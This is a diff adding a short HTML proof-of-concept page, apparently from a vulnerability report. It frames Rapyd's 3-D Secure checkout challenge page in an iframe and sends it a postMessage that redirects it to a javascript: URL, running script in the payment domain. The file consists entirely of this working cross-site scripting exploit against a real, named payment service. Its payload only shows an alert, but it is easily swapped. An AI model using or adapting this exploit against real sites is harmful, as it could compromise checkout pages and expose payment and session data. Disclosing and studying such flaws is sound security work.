@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<body>
+<iframe id="rapyd" src="https://checkout.rapyd.net/3ds/challenge.html"></iframe>
+<script>
+setTimeout(() => {
+    document.getElementById('rapyd').contentWindow.postMessage({
+    action: 'redirect',
+    url: 'javascript:alert(document.domain)'
+}, '*');
+}, 500);
+</script>
+</body>
+</html>
